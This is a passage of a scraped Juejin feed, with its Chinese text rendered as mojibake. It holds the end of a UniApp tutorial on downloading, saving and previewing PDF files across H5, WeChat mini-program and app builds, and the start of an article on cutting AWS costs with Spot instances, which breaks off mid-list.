  uni.<span class="hljs-title function_ invoke__">showLoading</span>({<span class="hljs-attr">title</span>:<span class="hljs-string">'ä¸‹è½½ä¸­...'</span>})
  <span class="hljs-comment">// å®šä¹‰å­˜å‚¨è·¯å¾„</span>
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">filePath</span> = `${uni.env.USER_DATA_PATH}/${item.name}.pdf`
  uni.<span class="hljs-title function_ invoke__">downloadFile</span>({
    <span class="hljs-attr">url</span>: item.fileUrl,
    <span class="hljs-attr">success</span>: (<span class="hljs-attr">data</span>:any) =&gt; {
      uni.<span class="hljs-title function_ invoke__">getFileSystemManager</span>().<span class="hljs-title function_ invoke__">saveFile</span>({
        <span class="hljs-attr">tempFilePath</span>: data.tempFilePath,
        <span class="hljs-attr">filePath</span>: filePath, // ç›®æ ‡è·¯å¾„ï¼ˆå¯é€‰ï¼‰
        <span class="hljs-attr">success</span>: (<span class="hljs-attr">res1</span>:any) =&gt; {
          uni.<span class="hljs-title function_ invoke__">openDocument</span>({
            <span class="hljs-attr">filePath</span>: res1.savedFilePath,
            <span class="hljs-attr">fileType</span>: <span class="hljs-string">'pdf'</span>,
            <span class="hljs-attr">showMenu</span>: <span class="hljs-literal">true</span>,
            <span class="hljs-attr">fail</span>: () =&gt; {
              uni.<span class="hljs-title function_ invoke__">showToast</span>({<span class="hljs-attr">icon</span>:<span class="hljs-string">'none'</span>,<span class="hljs-attr">title</span>:<span class="hljs-string">'æ‰“å¼€å¤±è´¥'</span>})
            },
          });
        },
        fail: err =&gt; {
          uni.<span class="hljs-title function_ invoke__">showToast</span>({<span class="hljs-attr">icon</span>:<span class="hljs-string">'none'</span>,<span class="hljs-attr">title</span>:<span class="hljs-string">'ä¿å­˜å¤±è´¥'</span>})
        }
      })
    },
    fail: (err) =&gt; {
      console.<span class="hljs-title function_ invoke__">log</span>(err);
      uni.<span class="hljs-title function_ invoke__">showToast</span>({
        <span class="hljs-attr">icon</span>: <span class="hljs-string">'none'</span>,
        <span class="hljs-attr">mask</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">title</span>: <span class="hljs-string">'å¤±è´¥è¯·é‡æ–°ä¸‹è½½'</span>,
      });
    },
    complete: () =&gt; {
      uni.<span class="hljs-title function_ invoke__">hideLoading</span>()
    },
  })
}
</code></pre>
<h2 data-id="heading-1">å®ç°åŸç†åˆ†æ</h2>
<h3 data-id="heading-2">1. ä¸‹è½½æµç¨‹</h3>
<p>UniAppæä¾›äº†<code>uni.downloadFile</code>APIç”¨äºæ–‡ä»¶ä¸‹è½½ï¼Œæ­¤æ–¹æ³•ä¼šå°†è¿œç¨‹æ–‡ä»¶ä¸‹è½½åˆ°ä¸´æ—¶è·¯å¾„ã€‚ä¸‹è½½æˆåŠŸåï¼Œé€šè¿‡<code>uni.getFileSystemManager().saveFile()</code>å°†æ–‡ä»¶ä»ä¸´æ—¶è·¯å¾„ä¿å­˜åˆ°æŒ‡å®šä½ç½®ï¼Œä½¿å…¶æŒä¹…åŒ–å­˜å‚¨ã€‚</p>
<h3 data-id="heading-3">2. é¢„è§ˆåŠŸèƒ½</h3>
<p>ä¿å­˜æˆåŠŸåï¼Œä½¿ç”¨<code>uni.openDocument</code>APIæ‰“å¼€PDFæ–‡ä»¶ã€‚è¯¥APIä¼šè‡ªåŠ¨è°ƒç”¨ç³»ç»Ÿä¸­å·²å®‰è£…çš„PDFé˜…è¯»å™¨æ¥æ‰“å¼€æ–‡ä»¶ï¼Œæä¾›è‰¯å¥½çš„ç”¨æˆ·ä½“éªŒã€‚</p>
<h2 data-id="heading-4">å¤šç«¯å…¼å®¹æ€§å¤„ç†</h2>
<h3 data-id="heading-5">ä¸åŒå¹³å°çš„å®ç°å·®å¼‚</h3>
<p>æ ¹æ®ç›®æ ‡å¹³å°çš„ä¸åŒï¼Œå¯èƒ½éœ€è¦é‡‡ç”¨ä¸åŒçš„å®ç°æ–¹æ¡ˆï¼š</p>
<ol>
<li><strong>H5å¹³å°</strong>ï¼šå¯ä»¥ä½¿ç”¨<code>window.open</code>ç›´æ¥åœ¨æ–°æ ‡ç­¾é¡µæ‰“å¼€PDFé“¾æ¥</li>
<li><strong>å¾®ä¿¡å°ç¨‹åº</strong>ï¼šéœ€åœ¨å¾®ä¿¡å…¬ä¼—å¹³å°é…ç½®<code>downloadFile</code>åˆæ³•åŸŸå</li>
<li><strong>APPç«¯</strong>ï¼šå¯ä½¿ç”¨ä¸Šè¿°ä»£ç å®ç°ï¼Œä¹Ÿå¯é›†æˆåŸç”ŸPDFæ’ä»¶è·å¾—æ›´å¥½ä½“éªŒ</li>
</ol>
<h3 data-id="heading-6">å¤šç«¯å…¼å®¹ä»£ç ç¤ºä¾‹</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">exportPDF</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// #ifdef H5</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(pdfUrl)
  <span class="hljs-comment">// #endif</span>
  
  <span class="hljs-comment">// #ifdef MP-WEIXIN</span>
  uni.<span class="hljs-title function_">downloadFile</span>({
    <span class="hljs-attr">url</span>: pdfUrl,
    <span class="hljs-attr">success</span>: <span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
      <span class="hljs-keyword">if</span> (res.<span class="hljs-property">statusCode</span> === <span class="hljs-number">200</span>) {
        uni.<span class="hljs-title function_">openDocument</span>({
          <span class="hljs-attr">filePath</span>: res.<span class="hljs-property">tempFilePath</span>,
          <span class="hljs-attr">showMenu</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">file</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æ–‡ä»¶æ‰“å¼€æˆåŠŸ"</span>)
          }
        })
      }
    }
  })
  <span class="hljs-comment">// #endif</span>
  
  <span class="hljs-comment">// #ifdef APP-PLUS</span>
  <span class="hljs-comment">// ä½¿ç”¨å‰é¢æä¾›çš„handleDownloadæ–¹æ³•</span>
  <span class="hljs-comment">// #endif</span>
}
</code></pre>
<h2 data-id="heading-7">ä¼˜åŒ–ä¸æ‰©å±•åŠŸèƒ½</h2>
<h3 data-id="heading-8">1. è‡ªå®šä¹‰ä¿å­˜è·¯å¾„</h3>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œæ–‡ä»¶ä¿å­˜åœ¨åº”ç”¨æ²™ç›’ç›®å½•å†…ã€‚å¦‚éœ€ä¿å­˜åˆ°ç”¨æˆ·è‡ªå®šä¹‰ç›®å½•ï¼ˆå¦‚æ‰‹æœºå­˜å‚¨çš„ç‰¹å®šæ–‡ä»¶å¤¹ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// Androidå¹³å°ä¿å­˜åˆ°è‡ªå®šä¹‰ç›®å½•
const <span class="hljs-attr">downLoadFile</span> = (file) =&gt; {
  let <span class="hljs-attr">dtask</span> = plus.downloader.createDownload(file.fileUrl, {
    filename: "file://storage/emulated/0/è‡ªå®šä¹‰æ–‡ä»¶å¤¹/" + file.originalName
  }, function(d, status) {
    if (<span class="hljs-attr">status</span> == <span class="hljs-number">200</span>) {
      let <span class="hljs-attr">fileSaveUrl</span> = plus.io.convertLocalFileSystemURL(d.filename)
      plus.runtime.openFile(d.filename)
    }
  })
  dtask.start()
}
</code></pre>
<h3 data-id="heading-9">2. ä¸‹è½½è¿›åº¦æ˜¾ç¤º</h3>
<p>å¯ä»¥æ·»åŠ è¿›åº¦ç›‘å¬ï¼Œæå‡ç”¨æˆ·ä½“éªŒï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> downloadTask = uni.<span class="hljs-title function_">downloadFile</span>({
  <span class="hljs-attr">url</span>: item.<span class="hljs-property">fileUrl</span>,
  <span class="hljs-attr">success</span>: <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
    <span class="hljs-comment">// æˆåŠŸå¤„ç†</span>
  }
})

downloadTask.<span class="hljs-title function_">onProgressUpdate</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ä¸‹è½½è¿›åº¦'</span> + res.<span class="hljs-property">progress</span>)
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å·²ä¸‹è½½'</span> + res.<span class="hljs-property">totalBytesWritten</span>)
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ€»å¤§å°'</span> + res.<span class="hljs-property">totalBytesExpectedToWrite</span>)
})
</code></pre>
<h3 data-id="heading-10">3. ä½¿ç”¨PDF.jså®ç°å†…åµŒé¢„è§ˆ</h3>
<p>å¯¹äºéœ€è¦åº”ç”¨å†…é¢„è§ˆçš„åœºæ™¯ï¼Œå¯ä»¥é›†æˆPDF.jsï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">web-view</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">"webViewUrl"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">web-view</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">pdfUrl</span>: <span class="hljs-string">''</span>,
      <span class="hljs-attr">webViewUrl</span>: <span class="hljs-string">''</span>
    }
  },
  <span class="hljs-title function_">onLoad</span>(<span class="hljs-params">options</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">pdfUrl</span> = options.<span class="hljs-property">url</span>
    <span class="hljs-comment">// ä½¿ç”¨PDF.jsçš„viewer.htmlé¢„è§ˆ</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">webViewUrl</span> = <span class="hljs-string">`/static/pdfjs/web/viewer.html?file=<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-variable language_">this</span>.pdfUrl)}</span>`</span>
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-11">å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-12">1. æ–‡ä»¶æ‰“å¼€å¤±è´¥</h3>
<ul>
<li><strong>åŸå› </strong>ï¼šè®¾å¤‡ä¸Šæ²¡æœ‰å®‰è£…PDFé˜…è¯»å™¨</li>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šæç¤ºç”¨æˆ·å®‰è£…ç›¸å…³åº”ç”¨ï¼Œæˆ–ä½¿ç”¨PDF.jsç­‰åœ¨çº¿é¢„è§ˆæ–¹æ¡ˆ</li>
</ul>
<h3 data-id="heading-13">2. ä¸‹è½½æƒé™é—®é¢˜</h3>
<ul>
<li><strong>Androidå¹³å°</strong>ï¼šéœ€è¦ç”³è¯·å­˜å‚¨æƒé™</li>
</ul>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// ç”³è¯·å­˜å‚¨æƒé™</span>
plus.android.<span class="hljs-built_in">requestPermissions</span>([
  <span class="hljs-string">'android.permission.WRITE_EXTERNAL_STORAGE'</span>,
  <span class="hljs-string">'android.permission.READ_EXTERNAL_STORAGE'</span>
], successCallback, errorCallback)
</code></pre>
<h3 data-id="heading-14">3. åŸŸåç™½åå•é™åˆ¶</h3>
<ul>
<li><strong>å¾®ä¿¡å°ç¨‹åº</strong>ï¼šéœ€åœ¨å¾®ä¿¡å…¬ä¼—å¹³å°é…ç½®downloadFileåˆæ³•åŸŸå</li>
</ul>
<h3 data-id="heading-15">4. äºŒè¿›åˆ¶æµæ–‡ä»¶å¤„ç†</h3>
<p>å¦‚æœåç«¯è¿”å›çš„æ˜¯æ–‡ä»¶æµè€Œéç›´æ¥é“¾æ¥ï¼Œéœ€è¦ç‰¹æ®Šå¤„ç†ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">uni.<span class="hljs-title function_">request</span>({
  <span class="hljs-attr">url</span>: fileUrl,
  <span class="hljs-attr">responseType</span>: <span class="hljs-string">'arraybuffer'</span>,
  <span class="hljs-attr">success</span>: <span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> {
    <span class="hljs-keyword">let</span> blob = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Blob</span>([response.<span class="hljs-property">data</span>], {<span class="hljs-attr">type</span>: <span class="hljs-string">'application/pdf;charset=UTF-8'</span>})
    <span class="hljs-keyword">let</span> pdfUrl = <span class="hljs-variable language_">window</span>.<span class="hljs-property">URL</span>.<span class="hljs-title function_">createObjectURL</span>(blob)
    <span class="hljs-comment">// ä½¿ç”¨æ­¤URLè¿›è¡Œé¢„è§ˆæˆ–ä¸‹è½½</span>
  }
})
</code></pre>
<h2 data-id="heading-16">æ€»ç»“</h2>
<p>æœ¬æ–‡è¯¦ç»†ä»‹ç»äº†åœ¨UniAppä¸­å®ç°PDFæ–‡ä»¶ä¸‹è½½ä¸é¢„è§ˆçš„å®Œæ•´æ–¹æ¡ˆã€‚æ ¸å¿ƒä»£ç ä½¿ç”¨äº†<code>uni.downloadFile</code>å’Œ<code>uni.openDocument</code>APIï¼Œå…·æœ‰è‰¯å¥½çš„è·¨å¹³å°å…¼å®¹æ€§ã€‚é’ˆå¯¹ä¸åŒå¹³å°å’Œç‰¹æ®Šéœ€æ±‚ï¼Œä¹Ÿæä¾›äº†ç›¸åº”çš„ä¼˜åŒ–æ–¹æ¡ˆå’Œæ‰©å±•åŠŸèƒ½ã€‚å…³é”®ç‚¹æ€»ç»“ï¼š</p>
<ol>
<li><strong>æ ¸å¿ƒæµç¨‹</strong>ï¼šä¸‹è½½â†’ä¿å­˜â†’é¢„è§ˆ</li>
<li><strong>å¤šç«¯å…¼å®¹</strong>ï¼šé€šè¿‡æ¡ä»¶ç¼–è¯‘å®ç°å„å¹³å°æœ€ä½³ä½“éªŒ</li>
<li><strong>ç”¨æˆ·ä½“éªŒ</strong>ï¼šæ·»åŠ è¿›åº¦æç¤ºå’Œé”™è¯¯å¤„ç†</li>
<li><strong>çµæ´»æ‰©å±•</strong>ï¼šæ”¯æŒè‡ªå®šä¹‰è·¯å¾„å’Œå†…åµŒé¢„è§ˆç­‰åŠŸèƒ½</li>
</ol>
<p>æ­¤æ–¹æ¡ˆå·²åœ¨å¤šä¸ªé¡¹ç›®ä¸­å®è·µéªŒè¯ï¼Œç¨³å®šå¯é ï¼Œå¯ä»¥ä½œä¸ºUniAppé¡¹ç›®æ–‡ä»¶å¤„ç†çš„åŸºç¡€å®ç°ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[äºšé©¬é€Šäº‘æ¸ é“å•†ï¼šæ€ä¹ˆä½¿ç”¨Spotå®ä¾‹å®ç°æˆæœ¬é™ä½70%ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7577050643202867250</link>    <guid>https://juejin.cn/post/7577050643202867250</guid>    <pubDate>2025-11-27T07:51:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577050643202867250" data-draft-id="7576978338755149874" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="äºšé©¬é€Šäº‘æ¸ é“å•†ï¼šæ€ä¹ˆä½¿ç”¨Spotå®ä¾‹å®ç°æˆæœ¬é™ä½70%ï¼Ÿ"/> <meta itemprop="keywords" content="æ¶æ„,è¿ç»´"/> <meta itemprop="datePublished" content="2025-11-27T07:51:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="äº‘æ¸ é“å•†yunshuguoji"/> <meta itemprop="url" content="https://juejin.cn/user/3854235718130362"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            äºšé©¬é€Šäº‘æ¸ é“å•†ï¼šæ€ä¹ˆä½¿ç”¨Spotå®ä¾‹å®ç°æˆæœ¬é™ä½70%ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3854235718130362/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    äº‘æ¸ é“å•†yunshuguoji
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:51:44.000Z" title="Thu Nov 27 2025 07:51:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æ–‡ç”±äº‘æ¢å›½é™…yunshuguojiæ’°å†™ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€å¼•è¨€</h2>
<p>åœ¨äº‘è®¡ç®—é¢†åŸŸï¼Œæˆæœ¬ä¼˜åŒ–å§‹ç»ˆæ˜¯ä¼ä¸šå…³æ³¨çš„æ ¸å¿ƒé—®é¢˜ã€‚éšç€ä¸šåŠ¡è§„æ¨¡çš„æ‰©å¤§ï¼Œäº‘èµ„æºçš„æ¶ˆè€—ä¹Ÿåœ¨ä¸æ–­æ”€å‡ï¼Œå¦‚ä½•æœ‰æ•ˆé™ä½æˆæœ¬æˆä¸ºå½“åŠ¡ä¹‹æ€¥ã€‚è€ŒAWS Spotå®ä¾‹çš„å‡ºç°ï¼Œä¸ºä¼ä¸šæä¾›äº†ä¸€ç§å¤§å¹…é™ä½è®¡ç®—æˆæœ¬çš„å¯èƒ½æ€§ï¼Œç”šè‡³å¯ä»¥å®ç°é«˜è¾¾70%çš„æˆæœ¬èŠ‚çº¦ã€‚æœ¬æ–‡å°†ä¸ºæ‚¨ç³»ç»ŸåŒ–ä»‹ç»å¦‚ä½•é€šè¿‡Spotå®ä¾‹å®ç°è¿™ä¸€ç›®æ ‡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef1c4e8d9581494b9f629420aec1e596~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LqR5rig6YGT5ZWGeXVuc2h1Z3Vvamk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764834703&amp;x-signature=oYIKHU%2B5kh0XMNaJU4EghftXr%2Bc%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<h2 data-id="heading-1">äºŒã€æ¦‚è¿°</h2>
<p>Spotå®ä¾‹æ˜¯AWSæä¾›çš„ä¸€ç§ç‰¹æ®Šç±»å‹çš„EC2å®ä¾‹ï¼Œå®ƒä»¬åˆ©ç”¨AWSæ•°æ®ä¸­å¿ƒçš„é—²ç½®è®¡ç®—èµ„æºï¼Œä»¥æä½çš„ä»·æ ¼ï¼ˆé€šå¸¸æ¯”æŒ‰éœ€å®ä¾‹ä½70%-90%ï¼‰æä¾›ç»™ç”¨æˆ·ã€‚ç„¶è€Œï¼ŒSpotå®ä¾‹æœ‰ä¸€ä¸ªç‰¹ç‚¹ï¼šå½“AWSéœ€è¦å›æ”¶èµ„æºæ—¶ï¼Œå®ä¾‹å¯èƒ½ä¼šè¢«ä¸­æ–­ï¼ˆæå‰ä¸¤åˆ†é’Ÿé€šçŸ¥ï¼‰ã€‚å› æ­¤ï¼Œå®ƒä»¬éå¸¸é€‚åˆå…·æœ‰å®¹é”™èƒ½åŠ›çš„åº”ç”¨åœºæ™¯ï¼Œå¦‚æ‰¹å¤„ç†ä½œä¸šã€å¤§æ•°æ®åˆ†æã€å®¹å™¨åŒ–å·¥ä½œè´Ÿè½½ç­‰ã€‚</p>
<h2 data-id="heading-2">ä¸‰ã€æ€ä¹ˆä½¿ç”¨Spotå®ä¾‹å®ç°æˆæœ¬é™ä½70%ï¼Ÿ</h2>
<ol>
<li>
<p>é€‰æ‹©åˆé€‚çš„åº”ç”¨åœºæ™¯ï¼šå¹¶éæ‰€æœ‰ä¸šåŠ¡éƒ½é€‚åˆä½¿ç”¨Spotå®ä¾‹ã€‚é‚£äº›å¯ä»¥ä¸­æ–­çš„è®¡ç®—ä»»åŠ¡ï¼Œå¦‚æ•°æ®å¤„ç†ã€æ¸²æŸ“ã€æµ‹è¯•ç¯å¢ƒç­‰ï¼Œæ˜¯Spotå®ä¾‹çš„ç†æƒ³é€‰æ‹©ã€‚å¯¹äºæ— çŠ¶æ€æœåŠ¡ï¼Œç»“åˆè‡ªåŠ¨ä¼¸ç¼©ç»„å’Œå¤šä¸ªå¯ç”¨åŒºéƒ¨ç½²ï¼Œä¹Ÿèƒ½æœ‰æ•ˆæé«˜ç¨³å®šæ€§ã€‚</p>
</li>
<li>
<p>ç«ä»·ç­–ç•¥è®¾ç½®ï¼šåœ¨å¯åŠ¨Spotå®ä¾‹æ—¶ï¼Œæ‚¨å¯ä»¥è®¾ç½®ä¸€ä¸ªæœ€é«˜ä»·ï¼ˆé€šå¸¸å»ºè®®è®¾ç½®ä¸ºæŒ‰éœ€å®ä¾‹çš„ä»·æ ¼ï¼‰ï¼Œå½“å¸‚åœºä»·æ ¼ä½äºæ‚¨çš„æœ€é«˜ä»·æ—¶ï¼Œå®ä¾‹å°±ä¼šè¿è¡Œã€‚åŒæ—¶ï¼Œä½¿ç”¨Spotå®ä¾‹æ± ï¼ˆå¤šä¸ªå®ä¾‹ç±»å‹å’Œå¯ç”¨åŒºï¼‰å¯ä»¥å¢åŠ è¯·æ±‚æˆåŠŸçš„æ¦‚ç‡ã€‚</p>
</li>
<li>
<p>å®¹é”™æ¶æ„è®¾è®¡ï¼šç”±äºSpotå®ä¾‹å¯èƒ½è¢«ä¸­æ–­ï¼Œæ‚¨éœ€è¦è®¾è®¡å®¹é”™æœºåˆ¶ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨è‡ªåŠ¨ä¼¸ç¼©ç»„ï¼ˆAuto Scaling Groupï¼‰æ¥åœ¨å®ä¾‹ä¸­æ–­æ—¶è‡ªåŠ¨è¡¥å……æ–°çš„å®ä¾‹ï¼›å°†å·¥ä½œè´Ÿè½½åˆ†å¸ƒåˆ°å¤šä¸ªå®ä¾‹ç±»å‹å’Œå¯ç”¨åŒºï¼›ç»“åˆä½¿ç”¨æŒ‰éœ€å®ä¾‹æˆ–é¢„ç•™å®ä¾‹ä½œä¸ºä¿éšœï¼Œç¡®ä¿å…³é”®ä¸šåŠ¡ä¸ä¸­æ–­ã€‚</p>
</li>
<li>
<p>ç›‘æ§ä¸ä¼˜åŒ–ï¼šåˆ©ç”¨AWSçš„æˆæœ¬ç®¡ç†å·¥å…·ï¼ˆå¦‚Cost Explorerï¼‰å’Œç›‘æ§å·¥å…·ï¼ˆå¦‚CloudWatchï¼‰æ¥è·Ÿè¸ªSpotå®ä¾‹çš„ä½¿ç”¨æƒ…å†µå’Œæˆæœ¬èŠ‚çº¦æ•ˆæœã€‚æ ¹æ®å†å²æ•°æ®è°ƒæ•´ç«ä»·ç­–ç•¥å’Œå®ä¾‹ç±»å‹ç»„åˆï¼Œè¿›ä¸€æ­¥ä¼˜åŒ–æˆæœ¬ã€‚<br/>
